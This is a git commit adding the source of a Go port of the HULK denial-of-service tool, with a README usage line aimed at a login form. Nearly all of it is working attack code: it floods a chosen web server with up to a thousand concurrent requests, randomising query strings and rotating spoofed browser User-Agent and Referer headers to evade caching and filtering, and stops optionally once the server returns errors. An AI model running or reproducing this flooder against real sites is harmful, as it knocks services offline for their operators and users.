7118701d4340872170b178a24e1b70260e01282e
Amos Burton <the.amos.burton@protonmail.com>
2020-08-28 15:55:24 -0500

    init

---
+++ README.md
@@ -0,0 +1,4 @@
+```shell script
+hulk --site http://localhost:8080 --data "usr={{10}}&pass={{10}}" --method POST
+```
+
---
+++ hulk.go
@@ -0,0 +1,366 @@
+package main
+
+/*
+ HULK DoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
+ Original Python utility by Barry Shteiman http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
+
+ This go program licensed under GPLv3.
+ Copyright Alexander I.Grafov <grafov@gmail.com>
+*/
+
+import (
+	"flag"
+	"fmt"
+	"io/ioutil"
+	"math/rand"
+	"net"
+	"net/http"
+	"net/url"
+	"os"
+	"os/signal"
+	"regexp"
+	"strconv"
+	"strings"
+	"sync/atomic"
+	"syscall"
+	"time"
+)
+
+const __version__ = "1.0.2"
+
+// const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
+const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
+
+const (
+	callGotOk uint8 = iota
+	callExitOnErr
+	callExitOnTooManyFiles
+	targetComplete
+)
+
+const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567891234567890"
+
+// global params
+var (
+	dataRe = regexp.MustCompile(`{{([\d-]+)}}`)
+	charsetLen      = len(charset)
+	safe            = false
+	headersReferers = []string{
+		"https://www.google.com/search?q=",
+		"https://search.yahoo.com/search?p=",
+		"https://www.bing.com/search?q=",
+		"https://www.usatoday.com/search/results?q=",
+		"https://search.aol.com/aol/search?q=",
+		"https://duckduckgo.com/?q=",
+	}
+	headersUseragents = []string{
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
+		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0",
+		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.52",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
+		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0",
+		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 OPR/69.0.3686.95",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 Edg/84.0.522.40",
+		"Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15",
+		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",
+		"Mozilla/5.0 (X11; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 Edg/84.0.522.44",
+		"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:79.0) Gecko/20100101 Firefox/79.0",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
+		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36 Edg/84.0.522.59",
+		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 OPR/69.0.3686.77",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.58",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
+		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
+	}
+	cur int32
+)
+
+type arrayFlags []string
+
+func (i *arrayFlags) String() string {
+	return "[" + strings.Join(*i, ",") + "]"
+}
+
+func (i *arrayFlags) Set(value string) error {
+	*i = append(*i, value)
+	return nil
+}
+
+func main() {
+	var (
+		version bool
+		site    string
+		agents  string
+		data    string
+		cookie  string
+		method  string
+		headers arrayFlags
+		durInt  int
+		dur     time.Duration
+	)
+
+	flag.BoolVar(&version, "version", false, "print version and exit")
+	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
+	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
+	flag.StringVar(&method, "method", "GET", "Method to send to destination.")
+	flag.StringVar(&cookie, "cookie", "", "cookie value to include in header.")
+	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
+	flag.StringVar(&data, "data", "", "Data to pass through to the URL, if present this will replace the GET or POST request data with this " +
+		"value. Use special value of {{N}} where N is the target number of random characters to use in this location.")
+	flag.IntVar(&durInt, "duration", 0, "length of attack in seconds before shutting down")
+	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
+	flag.Parse()
+
+	method = strings.ToUpper(method)
+
+	t := os.Getenv("HULKMAXPROCS")
+	maxproc, err := strconv.Atoi(t)
+	if err != nil {
+		maxproc = 1023
+	}
+
+	u, err := url.Parse(site)
+	if err != nil {
+		fmt.Println("err parsing url parameter\n")
+		os.Exit(1)
+	}
+
+	if version {
+		fmt.Println("Hulk", __version__)
+		os.Exit(0)
+	}
+
+	dur = time.Second * time.Duration(durInt)
+
+	if agents != "" {
+		if data, err := ioutil.ReadFile(agents); err == nil {
+			headersUseragents = []string{}
+			for _, a := range strings.Split(string(data), "\n") {
+				if strings.TrimSpace(a) == "" {
+					continue
+				}
+				headersUseragents = append(headersUseragents, a)
+			}
+		} else {
+			fmt.Printf("can't load User-Agent list from %s\n", agents)
+			os.Exit(1)
+		}
+	}
+
+	go func() {
+		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
+		start := time.Now()
+		ss := make(chan uint8, 8)
+		var (
+			err, sent int32
+		)
+		fmt.Println("In use               |\tResp OK |\tGot err")
+		for {
+			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
+				go httpcall(site, u.Host, method, data, cookie, headers, ss)
+			}
+			if sent%10 == 0 {
+				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+			}
+			switch <-ss {
+			case callExitOnErr:
+				atomic.AddInt32(&cur, -1)
+				err++
+			case callExitOnTooManyFiles:
+				atomic.AddInt32(&cur, -1)
+				maxproc--
+			case callGotOk:
+				sent++
+			case targetComplete:
+				sent++
+				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
+				os.Exit(0)
+			}
+			if dur > 0 && time.Now().After(start.Add(dur)) {
+				fmt.Println("time is up!")
+				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
+				os.Exit(0)
+			}
+		}
+	}()
+
+	ctlc := make(chan os.Signal)
+	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
+	<-ctlc
+	fmt.Println("\r\n-- Interrupted by user --        \n")
+}
+
+func httpcall(url, host, method, data, cookie string, headers arrayFlags, s chan uint8) {
+	atomic.AddInt32(&cur, 1)
+
+	var param_joiner string
+	var client = new(http.Client)
+	client.Transport = &http.Transport{
+		Proxy: http.ProxyFromEnvironment,
+		DialContext: (&net.Dialer{
+			Timeout:   60 * time.Second,
+			KeepAlive: 60 * time.Second,
+		}).DialContext,
+		ForceAttemptHTTP2:     true,
+		MaxIdleConns:          500,
+		IdleConnTimeout:       90 * time.Second,
+		TLSHandshakeTimeout:   60 * time.Second,
+		ExpectContinueTimeout: 10 * time.Second,
+	}
+
+	if strings.ContainsRune(url, '?') {
+		param_joiner = "&"
+	} else {
+		param_joiner = "?"
+	}
+
+	for {
+		var q *http.Request
+		var err error
+
+		if method == "GET" {
+			if data == "" {
+				q, err = http.NewRequest(method, url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
+			} else {
+				payload := buildDataString(data)
+				//log.Printf("sending GET payload: %s", payload)
+				q, err = http.NewRequest(method, url+param_joiner+payload, nil)
+			}
+		} else {
+			if data == "" {
+				q, err = http.NewRequest(method, url, strings.NewReader(buildblock(rand.Intn(100)+100)))
+			} else {
+				payload := buildDataString(data)
+				//log.Printf("sending POST payload: %s", payload)
+				q, err = http.NewRequest(method, url, strings.NewReader(payload))
+			}
+		}
+
+		if err != nil {
+			s <- callExitOnErr
+			return
+		}
+
+		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
+		q.Header.Set("Cache-Control", "no-cache")
+		q.Header.Set("Pragma", "no-cache")
+		q.Header.Set("Accept", "image/webp,image/apng,image/*,*/*;q=0.8")
+		if len(cookie) > 0 {
+			//q.Header.Set("Cookie", fmt.Sprintf("ASP.NET_SessionId=%s", buildblock(rand.Intn(10)+10)))
+			q.Header.Set("Cookie", buildDataString(cookie))
+		}
+		q.Header.Set("dnt", "1")
+		q.Header.Set("Accept-Charset", acceptCharset)
+		q.Header.Set("Accept-Encoding", "gzip, deflate, br")
+		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
+		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
+		q.Header.Set("Connection", "keep-alive")
+		q.Header.Set("Host", host)
+
+
+		// Overwrite headers with parameters
+
+		for _, element := range headers {
+			words := strings.Split(element, ":")
+			q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
+		}
+
+		r, e := client.Do(q)
+		if e != nil {
+			fmt.Fprintln(os.Stderr, e.Error())
+			if strings.Contains(e.Error(), "socket: too many open files") {
+				s <- callExitOnTooManyFiles
+				return
+			}
+			s <- callExitOnErr
+			return
+		}
+		r.Body.Close()
+		s <- callGotOk
+		if safe {
+			if r.StatusCode >= 500 {
+				s <- targetComplete
+			}
+		}
+	}
+}
+
+func buildDataString(input string) string {
+	res := dataRe.FindAllStringSubmatch(input, -1)
+	for _, r := range res {
+		replLen, _ := strconv.ParseInt(r[1], 0, 0)
+		repl := buildblock(rand.Intn(int(replLen)-1) + 1)
+		input = strings.Replace(input, r[0], repl, 1)
+	}
+	return input
+}
+
+func buildblock(size int) (s string) {
+	b := make([]byte, size)
+	for i := range b {
+		b[i] = charset[rand.Intn(charsetLen)]
+	}
+	return string(b)
+}
